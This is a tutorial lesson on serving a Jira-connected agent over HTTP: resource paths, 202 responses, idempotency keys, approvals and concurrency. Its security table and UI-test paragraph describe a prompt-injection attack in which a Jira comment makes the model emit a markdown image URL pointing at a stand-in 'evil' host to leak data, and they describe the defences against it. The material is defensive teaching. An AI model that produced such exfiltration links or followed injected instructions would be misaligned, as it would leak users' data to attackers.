# 10. Serving an agent over HTTP

## The concept

An agent turn is **slow** (seconds to minutes), **multi-step** (it calls tools),
**interruptible** (it can pause for a human) and **expensive** (every retry costs
tokens). A plain `POST /chat → 200 {answer}` endpoint handles none of that well:
- the request times out mid-turn;
- a retry runs the whole turn twice;
- there is nowhere to put "paused, waiting for approval".

The fix is to model the work as **resources**:

```
POST /api/v1/conversations                                  201 Created   + Location
POST /api/v1/conversations/{cid}/turns        {"message"}   202 Accepted  + Location → the turn
GET  /api/v1/conversations/{cid}/turns/{tid}                 200  status, reply, events so far
GET  /api/v1/conversations/{cid}/turns/{tid}/events          200  text/event-stream (lesson 11)
GET  /api/v1/conversations/{cid}/approvals/{aid}             200  what the agent wants to write
POST /api/v1/conversations/{cid}/approvals/{aid}/decision  {"decision":"approve"|"reject"}  202
DELETE /api/v1/conversations/{cid}                           204
```

**The agent layer did not change.** `pmagent/web/sessions.py::ConversationSession`
drives the same `pmagent/assistant.py::PMAssistant` the CLI does. `send()` and
`resume()` run on a worker thread, and their `TurnResult` becomes resource state.
The CLI's `main.py::resolve_approvals` loop becomes the approvals sub-resource.
That was the payoff of keeping `PMAssistant` free of terminal I/O.

## The practices, and where each one lives

| Practice | Why | In this repo |
|----------|-----|--------------|
| Nouns in paths, a version prefix | URLs name things, methods name actions. `/v1` lets you change shapes later without breaking clients | `pmagent/web/app.py::create_app`: the approval **decision** is a sub-resource, not `/approve` |
| **201 + Location** on create | the client learns the new resource's URL from the server, not by building it | `create_conversation` |
| **202 + Location** for background work | "accepted, not finished". The turn is a resource you can poll or stream | `create_turn`, `decide` |
| **409 Conflict** for state clashes | a second message while one is running, or while an approval waits; changing a decision already made | `pmagent/web/sessions.py::ConversationSession.start_turn`, `ConversationSession.decide` |
| **One error format: RFC 9457** | clients switch on a stable `type`, not on prose. Each `type` URL opens a page explaining it | `pmagent/web/problems.py` (`CATALOG`, `install`) |
| Typed schemas → OpenAPI | validation, docs and client generation from one source | `pmagent/web/schemas.py`; browse `/api/docs` |
| **Idempotency-Key** | a network retry must not send the message, and spend the tokens, twice | `ConversationSession.start_turn`: key → SHA-256 of the body → the same turn; a different body with the same key → 422 |
| Idempotent decisions | re-posting "approve" is harmless; changing your mind after is a 409 | `ConversationSession.decide` |
| Links in responses | `events_url` and `decision_url` mean clients follow links instead of hard-coding paths | `pmagent/web/schemas.py::TurnOut` (`url`, `events_url`), `pmagent/web/schemas.py::ApprovalOut` (`decision_url`) |
| Wrapped collections | `{"items": [...]}` can grow fields without breaking anyone | `pmagent/web/schemas.py::TurnList` |

### Security for a local agent with your credentials behind it

This server can post Jira comments as you. "It only listens on 127.0.0.1" is not
enough on its own, so each layer below closes a specific hole.

| Threat | Defence | Code |
|--------|---------|------|
| **DNS rebinding.** A web page re-resolves its own name to 127.0.0.1 and becomes "same-origin" | Host allowlist: only `127.0.0.1` / `localhost` are answered | `pmagent/web/app.py::SecurityMiddleware` |
| **CSRF.** Another site's page POSTs `approve` | state-changing requests must carry *our* `Origin`, or none; JSON bodies must be `application/json` | same |
| **Prompt-injection exfiltration.** A Jira comment tricks the model into writing `![x](https://evil/?data=…)`, and rendering it leaks data | strict **Content-Security-Policy** (`img-src 'self' data:`, `connect-src 'self'`, `script-src 'self'`); DOMPurify forbids `<img>`; libraries are vendored (no CDN scripts) | `STRICT_CSP`, `pmagent/web/static/app.js`, `pmagent/web/static/vendor/README.md` |
| Other users on the machine or network | optional `PMAGENT_API_TOKEN` bearer auth. `web.py` refuses a non-loopback bind without it, and refuses `0.0.0.0` without `--allowed-host <name>`: the allowlist holds names clients *send*, never a bind address. It warns that remote use needs TLS in front | `create_app` → `require_token`; `web.py::main`, `web.py::build_server` |

`tests/test_web_api.py` has a test for each of the first three rows, and
`tests/test_web_entry.py` for the last.

`tests/test_web_ui.py` drives the real page in Chromium and checks that a model
reply containing `![x](https://evil…)`, `<img onerror>` and `<script>` renders no
image and runs nothing. That test was mutation-checked: allowing `<img>` makes it
fail. These browser tests **skip** unless Playwright's Chromium can launch (see
CLAUDE.md).

### Honest limits

These are documented rather than hidden:
- conversations live **in memory**, so a restart forgets them (the CLI and the
  LangGraph original's `MemorySaver` behave the same);
- there is no rate limiting and no multi-user accounts: this API is for one local
  user;
- with Anthropic, concurrent conversations each build their own model object. That
  path is untested here, because no Anthropic key is available.

## Concurrency, briefly

Strands' `agent()` is synchronous, so each turn runs on its own thread
(`ConversationSession._spawn`). A per-conversation lock allows one turn at a
time per conversation. Different conversations run in parallel. The one trap is
the SSE stream in lesson 11: waiting for events must never block the async
server's event loop. `tests/test_web_concurrency.py` proves it doesn't, using a
real uvicorn server. It was also mutation-tested: with the wait moved onto the
loop, the test fails.

## How the LangGraph original did it

It had no HTTP layer. Its `main.py` docstring promised that "a second frontend
(Studio, Slack, web) can be added later without duplicating any logic", and this
lesson cashes that promise in: the agent layer is untouched, and the web layer only
translates between HTTP and `PMAssistant`.

## Exercise

Start the **offline demo**: `uv run scripts/demo_web.py` (add `--port 8124` if
8000 is busy, and use that port below). It runs the real app,
agents and gate with a scripted model and fake Jira, needs no key, and writes
nothing. It answers "Is the FX epic at risk?", "Post a comment on DEMO-101" and
"Write a PRD from these notes: …". (**live** alternative:
`uv run scripts/smoke.py --web`, the real model and Jira with every write
blocked. Avoid plain `web.py` if your `.env` points at a real Jira.)

1. Open http://127.0.0.1:8000/api/docs. Create a conversation, then a turn with
   the message `Is the FX epic at risk?`. What `Location` did each return? The
   Swagger UI page loads its scripts from a CDN, so it needs internet. Offline,
   use curl: `curl -si -X POST http://127.0.0.1:8000/api/v1/conversations` shows
   the headers, and lesson 11's exercise 4 has the rest of the commands.
2. Send the same `POST …/turns` twice with the same `Idempotency-Key` header, then
   with a different body. Compare the status codes and `GET …/turns`.
3. In `tests/test_web_api.py`, find the test for each security row above. Break
   `SecurityMiddleware`'s Origin check and run `uv run pytest tests/test_web_api.py`.
4. Design question: why is a new message while an approval waits a **409** here,
   when the CLI silently abandons the approval? (Hint: who can see the side effect?)
